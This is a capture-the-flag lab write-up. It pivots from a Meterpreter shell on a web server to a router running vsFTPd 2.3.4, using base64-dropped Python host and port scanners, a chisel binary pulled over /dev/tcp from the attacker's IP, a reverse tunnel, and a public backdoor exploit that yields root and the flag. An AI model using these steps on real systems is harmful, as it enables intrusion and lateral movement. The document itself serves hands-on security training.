
## Get a shell from meterpreter

On the shell you got on the [[WEBAPP flag#Meterpreter|Meterpreter]] run the following:

```
meterpreter> shell

$ python -c 'import pty; pty.spawn("/bin/bash")'
$ export TERM=xterm
```

> 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
>     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
>     inet 127.0.0.1/8 scope host lo
>        valid_lft forever preferred_lft forever
> 14: eth0@if15: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
>     link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
>     inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
>        valid_lft forever preferred_lft forever
> 22: eth1@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default 
>     link/ether 02:42:ac:10:01:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
>     inet 172.16.1.10/24 brd 172.16.1.255 scope global eth1
>        valid_lft forever preferred_lft forever


## Try to explore the network
### IP route show
This command will display the routing table, which includes information such as destination network, gateway, netmask, interface, and metric for each route.

```
ip route show
```

> 172.16.1.0/24 dev eth1 proto kernel scope link src 172.16.1.10 
> 172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2 


### ss
it is used to display socket statistics.

`ss`

> NetidState Recv-Q Send-Q               Local Address:Port    Peer Address:Port  
> u_strESTAB 0      0                                * 23947              * 23946 
> u_strESTAB 0      0                                * 23946              * 23947 
> u_strESTAB 0      0                                * 23754              * 23755 
> u_strESTAB 0      0                                * 23755              * 23754 
> u_strESTAB 8      0         /run/php/php7.2-fpm.sock 28287              * 0     
> tcp  ESTAB 0      160                     172.18.0.2:59092     10.8.40.30:4445  

### ip -s neigh

The command `ip -s neigh` is used to display information about the neighbor cache in Linux. The neighbor cache is used to store information about resolved IP addresses and their corresponding link-layer addresses (MAC addresses) on the local network.

```
ip -s neigh
```

> 172.18.0.1 dev eth0 lladdr 02:42:ed:e4:7c:f0 ref 1 used 9/0/4 probes 1 REACHABLE

**FAILED** indicates that the system could not be reached. 
**STALE** indicates that the connection hasn’t been recently verified.

### arp.py

Are there any other machines connect to the network? Considering there are not much tools installed, an idea is try to connect to each ip, and check the arp table.

The following code will do it.

| arp.py                                                                                                                                                                                                                                                                                                                                                      |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| import socket<br><br>`for i in range(0, 256):`<br>    `sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)`<br>    `sock.settimeout(0.5)`<br>    `ip = '172.16.1.{}'.format(i)`<br>    `if 0 == sock.connect_ex((ip, 22)):`<br>        `sock.close()`<br>        `print(ip + '   ON' , flush=True)`<br>    `else:`<br>        `print(ip,  flush=True)` |
|                                                                                                                                                                                                                                                                                                                                                             |
- Creata file called arp.py with the above code.
- In order to insert it on the victim machine you have to encode it.
	`cat arp.py | base64 | tr -d '\n' | xclip`
	
> Here's a breakdown of what each part of the command does:
> 
> 1. `cat arp.py`: Reads the contents of the file `arp.py`.
> 2. `base64`: Encodes the input data in base64.
> 3. `tr -d '\n'`: Removes newline characters from the output.
> 4. `xclip`: Copies the resulting encoded text to the clipboard.

#### Copy the encoded file on the victim machine

On the victim machine run the following code:

> www-data@app:~/html$

`$ echo 'aW1wb3J0IHNvY2tldAoKZm9yIGkgaW4gcmFuZ2UoMCwgMjU2KToKICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICBzb2NrLnNldHRpbWVvdXQoMC41KQogICAgaXAgPSAnMTcyLjE2LjEue30nLmZvcm1hdChpKQogICAgaWYgMCA9PSBzb2NrLmNvbm5lY3RfZXgoKGlwLCAyMikpOgogICAgICAgIHNvY2suY2xvc2UoKQogICAgICAgIHByaW50KGlwICsgJyAgIE9OJyAsIGZsdXNoPVRydWUpCiAgICBlbHNlOgogICAgICAgIHByaW50KGlwLCAgZmx1c2g9VHJ1ZSkK'  | base64 -d > arp.py`


#### Run arp.py
`$ python3 arp.py`

> 172.16.1.0
> 172.16.1.1
> 172.16.1.2
> 172.16.1.3

#### ip -s neigh

> 172.16.1.254 dev eth1  used 4/64/1 probes 6 FAILED
> 172.16.1.245 dev eth1  used 9/69/6 probes 6 FAILED
> **172.16.1.128 dev eth1 lladdr 02:42:ac:10:01:80 used 67/67/30 probes 4 STALE**



> Here's a breakdown of the information in the last line:
> 
> - `172.16.1.128`: The IP address of the neighbor.
> - `dev eth1`: The network interface (`eth1`) associated with the neighbor.
> - `lladdr 02:42:ac:10:01:80`: The link-layer address (MAC address) of the neighbor.
> - `used 67/67/30`: Information about how recently the entry has been used. This is in the format `used <seconds_since_last_used>/<use_count>/<last_update_time>`.
> - `probes 4`: The number of ARP probes sent to validate the entry.
> - `STALE`: The state of the neighbor entry. In this case, it is "STALE", meaning that the entry is no longer being used actively but is kept in the cache for a certain period of time before being removed.
> 
> Overall, this line indicates that the IP address `172.16.1.128` was previously associated with the MAC address `02:42:ac:10:01:80` on the network interface `eth1`, but the entry is now considered stale.

You found a 172.16.1.128.

### Check what ports this machine is listening on


| ports.py                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `def scan(ip):`<br>  `print('\n== ' + ip)`<br>  `try:`<br>    `for port in range(1,65535):`  <br>      `sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)`<br>      `sock.settimeout(0.2)`<br>      `result = sock.connect_ex((ip, port))`<br>      `if result == 0:`<br>        `sock.setblocking(0)`<br>        `ready = select.select([sock], [], [], 0.5)`<br>        `if ready[0]:`<br>          `data = sock.recv(4096)`<br>        `print("Port {}:      Open\n  {}".format(port, data))`<br>        `sock.close()`<br>`#      else:`<br>`#        print('.', end='', flush=True)`<br>  `except KeyboardInterrupt:`<br>    `sys.exit()`<br>  `except socket.gaierror:`<br>    `print('Hostname could not be resolved.')`<br>    `return`<br>  `except socket.error:`<br>    `print("Couldn't connect to server.")`<br>    `return`<br>`scan('172.16.1.128')` |

- Creata file called ports.py with the above code.
- In order to insert it on the victim machine you have to encode it.
	`cat ports.py | base64 | tr -d '\n' | xclip`

### Copy the encoded file on the victim machine

On the victim machine run the following code:

> www-data@app:~/html$

`echo "IyEvdXNyL2Jpbi9weXRob24zCmltcG9ydCBzb2NrZXQKaW1wb3J0IHNlbGVjdApkZWYgc2NhbihpcCk6CiAgcHJpbnQoJ1xuPT0gJyArIGlwKQogIHRyeToKICAgIGZvciBwb3J0IGluIHJhbmdlKDEsNjU1MzUpOiAgCiAgICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgIHNvY2suc2V0dGltZW91dCgwLjIpCiAgICAgIHJlc3VsdCA9IHNvY2suY29ubmVjdF9leCgoaXAsIHBvcnQpKQogICAgICBpZiByZXN1bHQgPT0gMDoKICAgICAgICBzb2NrLnNldGJsb2NraW5nKDApCiAgICAgICAgcmVhZHkgPSBzZWxlY3Quc2VsZWN0KFtzb2NrXSwgW10sIFtdLCAwLjUpCiAgICAgICAgaWYgcmVhZHlbMF06CiAgICAgICAgICBkYXRhID0gc29jay5yZWN2KDQwOTYpCiAgICAgICAgcHJpbnQoIlBvcnQge306ICAgICAgT3BlblxuICB7fSIuZm9ybWF0KHBvcnQsIGRhdGEpKQogICAgICAgIHNvY2suY2xvc2UoKQojICAgICAgZWxzZToKIyAgICAgICAgcHJpbnQoJy4nLCBlbmQ9JycsIGZsdXNoPVRydWUpCiAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgc3lzLmV4aXQoKQogIGV4Y2VwdCBzb2NrZXQuZ2FpZXJyb3I6CiAgICBwcmludCgnSG9zdG5hbWUgY291bGQgbm90IGJlIHJlc29sdmVkLicpCiAgICByZXR1cm4KICBleGNlcHQgc29ja2V0LmVycm9yOgogICAgcHJpbnQoIkNvdWxkbid0IGNvbm5lY3QgdG8gc2VydmVyLiIpCiAgICByZXR1cm4Kc2NhbignMTcyLjE2LjEuMTI4Jyk=" | base64 -d > ports.py`

### Run ports.py on the victim machine
`$ python3 ports.py`

> == 172.16.1.128
> Port 21:      Open
>   b'220 (vsFTPd 2.3.4)\r\n
>   
> Port 179:      Open
>   b''
>   
> Port 2601:      Open
>   b'\r\nHello, this is Quagga (version 1.2.4).\r\nCopyright 1996-2005 Kunihiro Ishiguro, et al.\r\n\r\n\r\nUser Access Verification\r\n\r\n\xff\xfb\x01\xff\xfb\x03\xff\xfe"\xff\xfd\x1fPassword: '
>   
> Port 2605:      Open
>   b'\r\nHello, this is Quagga (version 1.2.4).\r\nCopyright 1996-2005 Kunihiro Ishiguro, et al.\r\n\r\n\r\nUser Access Verification\r\n\r\n\xff\xfb\x01\xff\xfb\x03\xff\xfe"\xff\xfd\x1fPassword: '

There's a FTP port open, 21 running vsFTPd 2.3.4.



## Forwarding with chisel

![[chisel.png]]

1. On one terminal on your attacking machine run:

	`$ nc -lnvp 443 < /usr/local/bin/chisel`

2. In order to copy chisel to the victim machine, on the reverse shell run:

```
	$ cat > chisel < /dev/tcp/10.8.40.30/443
```

3. Wait for a while  and exit with Ctrl+C. Run:

```
	$ chmod +x chisel
```

4. On another terminal on the attacking machine run:

```
	$ chisel server --reverse -p 1234
```

> 2024/04/14 14:20:55 server: Reverse tunnelling enabled
> 2024/04/14 14:20:55 server: Fingerprint 61357eJjhQmxrso/PuXL3bN9RbJBqvY7NsEZV3qehEg=
> 2024/04/14 14:20:55 server: Listening on http://0.0.0.0:1234

5. Close the netcat connection from point 1.
6. On the reverse shell run:

```
$ ./chisel client 10.8.40.30:1234 R:21:172.16.1.128:21 R:6200:172.16.1.128:6200
```
## vsFTPd 2.3.4 Exploitation

1. On the attacking machine Install the Exploit.

```
$ git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git
```

2. Run the following command:

```
$ python3 exploit.py localhost
```

> [+] Got Shell!!!
> [+] Opening connection to localhost on port 21: Done
> [*] Closed connection to localhost port 21
> [+] Opening connection to localhost on port 6200: Done
> [*] Switching to interactive mode
> $

3. Run:

```
$ id
```

> uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

## Get the flag

```
$ cat /root/flag.txt
```

> {FLAG:Router1:c877f00ce2b886446395150589166dcd}




## Router exploration

Explore the router to discover its configuration.


Run on the shell you got with vsFTPd 2.3.4 Exploitation the following commands:

```
$ hostname
```

> router1.ctx.ctf

```
$ ps -Af

```

> ![[ps-af.png]]


[[BGP hIjacking]]
